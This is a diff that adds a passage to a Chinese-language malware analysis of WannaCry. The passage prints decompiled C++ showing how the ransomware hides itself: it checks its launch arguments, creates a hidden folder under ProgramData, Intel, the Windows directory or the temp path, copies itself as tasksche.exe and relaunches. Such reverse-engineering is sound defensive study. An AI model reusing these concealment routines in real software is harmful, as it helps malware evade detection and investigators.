@@ -74,4 +74,61 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 }
 ```
 
-WinMain的代码很容易理解，声明了几个变量，其中CProgram对象，CPeBuilder指针，以及fpTaskStart是整个WinMain运行的关键，WinMain的目的是动态加载一个Pe dll到内存中并运行起来，整个过程做的相当的隐蔽。 WinMain函数
+WinMain的代码很容易理解，声明了几个变量，其中CProgram对象，CPeBuilder指针，以及fpTaskStart是整个WinMain运行的关键，WinMain的目的是动态加载一个Pe dll到内存中并运行起来，整个过程做的相当的隐蔽。 WinMain函数在栈上声明了一个520 byte的数组，用来获取当前进程的完整路径，程序会利用这个路径将文件复制一份并命名为tasksche.exe，并调用StartMalware启动自己。
+
+在这里Malware已经通过漏洞进入Endpoint中并且被launch起来了，我认为这里存在一个common的阶段，我把这个阶段定义为**隐藏阶段**。何为隐藏阶段，换句话说在这个阶段Malware首先要做的不是执行攻击代码，而是在实施攻击之前首先隐匿自己的行踪，伪装自己为一个看起来正常的程序，并在日后的日志调查中迷惑分析人员。
+
+```C++
+if ( *_p___argc() != 2
+|| (argv = _p___argv(), strcmp(*(*argv + 1), aI))
+|| !CreateHiddenData(0)
+|| (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
+|| !StartMalware() )
+```
+
+仔细看一下这段代码，Wannacry启动后的第一时间进行了几个关键操作：
+
+- 检查启动参数
+- 创建隐藏数据(folder)
+- 重命名为tasksche.exe
+- 再次启动自己
+
+**创建隐藏数据**
+
+```C++
+int __cdecl CreateHiddenData(wchar_t *p)
+{
+  int result; 
+  __int16 wszWindowsPath[260]; 
+  __int16 wszProgramData[260];
+  __int16 wszServiceName[100];
+
+  wszWindowsPath[0] = g_ComputerName;
+  memset(&wszWindowsPath[1], 0, 516u);
+  wszWindowsPath[259] = 0;
+  wszProgramData[0] = g_ComputerName;
+  memset(&wszProgramData[1], 0, 516u);
+  wszProgramData[259] = 0;
+  wszServiceName[0] = g_ComputerName;
+  memset(&wszServiceName[1], 0, 196u);
+  wszServiceName[99] = 0;
+  MultiByteToWideChar(0, 0, szServiceName, -1, wszServiceName, 99);
+  GetWindowsDirectoryW(wszWindowsPath, 260u);
+  wszWindowsPath[2] = 0;
+  swprintf(wszProgramData, aSProgramdata, wszWindowsPath);
+  if ( GetFileAttributesW(wszProgramData) != INVALID_FILE_ATTRIBUTES && CreateFolder(wszProgramData, wszServiceName, p)
+    || (swprintf(wszProgramData, aSIntel, wszWindowsPath), CreateFolder(wszProgramData, wszServiceName, p))
+    || CreateFolder(wszWindowsPath, wszServiceName, p) )
+  {
+    result = 1;
+  }
+  else
+  {
+    GetTempPathW(260u, wszProgramData);
+    if ( wcsrchr(wszProgramData, '\\') )
+      *wcsrchr(wszProgramData, '\\') = 0;
+    result = CreateFolder(wszProgramData, wszServiceName, p) != 0;
+  }
+  return result;
+}
+```
